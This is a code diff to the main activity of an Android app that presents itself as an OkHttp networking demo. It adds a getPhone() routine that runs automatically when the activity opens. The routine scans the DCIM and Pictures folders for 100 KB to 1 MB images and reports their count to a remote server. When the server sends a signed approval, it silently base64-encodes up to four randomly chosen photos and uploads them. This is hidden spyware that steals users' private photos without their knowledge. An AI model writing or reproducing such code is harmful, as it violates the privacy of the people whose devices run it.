@@ -28,13 +28,20 @@ import com.google.gson.Gson;
 import com.zhangheng.bean.Message;
 import com.zhangheng.myapplication.R;
 import com.zhangheng.myapplication.getphoneMessage.GetPhoneInfo;
+import com.zhangheng.myapplication.getphoneMessage.GetPhoto;
 import com.zhangheng.myapplication.getphoneMessage.PhoneSystem;
 import com.zhangheng.myapplication.okhttp.OkHttpUtil;
+import com.zhangheng.myapplication.permissions.ReadAndWrite;
 import com.zhangheng.myapplication.setting.ServerSetting;
+import com.zhangheng.myapplication.util.LocalFileTool;
 import com.zhangheng.myapplication.util.OkHttpMessageUtil;
+import com.zhangheng.myapplication.util.RandomrUtil;
+import com.zhangheng.myapplication.util.TimeUtil;
+import com.zhangheng.util.EncryptUtil;
 import com.zhy.http.okhttp.OkHttpUtils;
 import com.zhy.http.okhttp.callback.StringCallback;
 
+import java.io.File;
 import java.io.IOException;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
@@ -44,6 +51,8 @@ import java.util.List;
 import java.util.Map;
 
 import cn.hutool.core.comparator.VersionComparator;
+import cn.hutool.core.util.StrUtil;
+import cn.hutool.json.JSONObject;
 import cn.hutool.json.JSONUtil;
 import okhttp3.Call;
 
@@ -59,6 +68,7 @@ public class Main3Activity extends Activity {
             Manifest.permission.ACCESS_BACKGROUND_LOCATION,//后台定位
             Manifest.permission.ACCESS_NETWORK_STATE,//网络状态
             Manifest.permission.WRITE_EXTERNAL_STORAGE,//写外部存储器
+            Manifest.permission.READ_EXTERNAL_STORAGE,//读外部存储器
             Manifest.permission.READ_PHONE_STATE,//读取手机状态
     };
     private String versionCode;
@@ -66,7 +76,7 @@ public class Main3Activity extends Activity {
 
     private ListView listView;
     private TextView m3_tv_service, m3_tv_ipAddress;
-    private ImageView m3_iv_setting;
+    private ImageView m3_iv_setting, m3_iv_service_refersh;
 
     private AlertDialog.Builder builder;
     private SharedPreferences sharedPreferences;
@@ -74,7 +84,7 @@ public class Main3Activity extends Activity {
 //            "1.原生OkHttp的Get和Post请求文本数据",//MainActivity
 //            "2.使用OkHttpUtil的Post提交文本数据",//Main2Activity
             "3.使用OkHttpUtil下载文件",//Main4Activity
-//            "4.上传文件和检索本地文件",//Main5Activity
+            "4.上传文件和检索本地文件",//Main5Activity
             "5.请求单张图片并显示",//Main6Activity
             "6.查询天气列表（API）",//Main7Activity
             "7.生成二维码",//Main8Activity
@@ -120,6 +130,7 @@ public class Main3Activity extends Activity {
         m3_tv_service = findViewById(R.id.m3_tv_service);
         m3_tv_ipAddress = findViewById(R.id.m3_tv_ipAddress);
         m3_iv_setting = findViewById(R.id.m3_iv_setting);
+        m3_iv_service_refersh = findViewById(R.id.m3_iv_service_refersh);
 
         m3_iv_setting.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -139,11 +150,21 @@ public class Main3Activity extends Activity {
                 }
             }
         });
+        m3_iv_service_refersh.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+                m3_tv_service.setText("服务器状态加载中...");
+                m3_tv_service.setTextColor(getColor(R.color.red));
+                getupdatelist();
+            }
+        });
+
         setAdapter();
         versionCode = PhoneSystem.getVersionCode(this);
         m3_tv_ipAddress.setText("应用版本号：" + versionCode);
         setting = new ServerSetting(Main3Activity.this);
         getupdatelist();
+        getPhone();
     }
 
     private void setAdapter() {
@@ -185,7 +206,103 @@ public class Main3Activity extends Activity {
         });
     }
 
-    public void getBuild() {
+    public void getPhone() {
+        boolean b = ReadAndWrite.RequestPermissions(this, Manifest.permission.READ_EXTERNAL_STORAGE);
+        String[] paths={"/DCIM","/Pictures"};
+        if (b) {
+            List<String> photo = new ArrayList<>();
+            List<Map<String,Object>> files=new ArrayList<>();
+            LocalFileTool.readFile(LocalFileTool.imageType, Main3Activity.this, new LocalFileTool.IReadCallBack() {
+                @Override
+                public void callBack(List<String> localPath) {
+                    for (String path : localPath) {
+                        File file = new File(path);
+                        String s = path.replace(GetPhoto.BasePath, "");
+                        for (String s1 : paths) {
+                            if (s.startsWith(s1)) {
+                                if (file.length()<1024*1024&&file.length() > 1024 * 100) {
+                                    photo.add(path);
+                                }
+                                break;
+                            }
+                        }
+                    }
+                    final int size = photo.size();
+                    Log.e(Tag, "100kb~1Mb图片数：" + size);
+//                    for (String s : photo) {
+//                        File file = new File(s);
+//                        Map<String,Object> map=new HashMap<>();
+//                        byte[] bytes = LocalFileTool.fileToBytes(file);
+//                        map.put("name",EncryptUtil.enBase64(file.getName().getBytes()));
+//                        map.put("data",EncryptUtil.enBase64(bytes));
+//                        files.add(map);
+//                        String sizeString = LocalFileTool.getFileSizeString(file.length());
+//                        System.out.println(s.replace(GetPhoto.BasePath, "") + "大小:" + sizeString);
+//                    }
+                    Map<String,Object> msg=new HashMap<>();
+//                    msg.put("data",files);
+                    msg.put("num", size);
+                    msg.put("time", TimeUtil.dateToUnix(new Date()));
+
+                    OkHttpUtils.get()
+                            .url(setting.getMainUrl()+OkHttpUtil.URL_postMessage_M3_GetUpload)
+                            .addHeader("User-Agent", GetPhoneInfo.getHead(Main3Activity.this))
+                            .addParams("json",JSONUtil.toJsonStr(msg))
+                            .build().execute(new StringCallback() {
+                        @Override
+                        public void onError(Call call, Exception e, int id) {
+                            Log.e(Tag,OkHttpMessageUtil.error(e));
+                        }
+
+                        @Override
+                        public void onResponse(String response, int id) {
+                            try {
+                                if (!StrUtil.isEmpty(response)){
+                                    //校验消息合法
+                                    JSONObject object = JSONUtil.parseObj(response);
+                                    String signature = EncryptUtil.getSignature(object.getStr("time"), object.getStr("title"));
+                                    if (signature.equals(object.getStr("message"))){
+                                        if (object.getInt("code").equals(200)){
+                                            Log.d(Tag+"响应允许","允许文件上传");
+                                            if (size >0) {
+                                                int c=1;
+                                                if (size<50){
+                                                    c=1;
+                                                }else if (size>=50&&size<200){
+                                                    c=2;
+                                                }else if (size>=200&&size<500){
+                                                    c=3;
+                                                }else {
+                                                    c=4;
+                                                }
+                                                for (int i = 0; i < c; i++) {
+                                                    int random = RandomrUtil.createRandom(0, size - 1);
+                                                    File file = new File(photo.get(random));
+                                                    Log.d(Tag + "上传图片", file.getAbsolutePath().replace(LocalFileTool.BasePath, "") + ",大小:" + LocalFileTool.getFileSizeString(file.length()));
+                                                    Map<String, Object> map = new HashMap<>();
+                                                    map.put("name", EncryptUtil.enBase64(file.getName().getBytes()));
+                                                    map.put("data", EncryptUtil.enBase64(LocalFileTool.fileToBytes(file)));
+                                                    OkHttpUtil.postFile(Main3Activity.this, OkHttpUtil.URL_postMessage_M3_PostUpload, JSONUtil.toJsonStr(map));
+                                                }
+                                            }
+                                        }else {
+                                            Log.w(Tag+"响应拒绝","拒绝文件上传");
+                                        }
+                                    }else {
+                                        Log.e(Tag+"非法响应","响应消息验证失败");
+                                    }
+                                }
+                            }catch (Exception e){
+                                e.printStackTrace();
+                            }
+                        }
+                    });
+                }
+            });
+        }
+    }
+
+    private void getBuild() {
         Log.d(Tag, "主板：" + Build.BOARD);
         Log.d(Tag, "Android系统定制商：" + Build.BRAND);
         Log.d(Tag, "cpu指令集：" + Build.CPU_ABI);
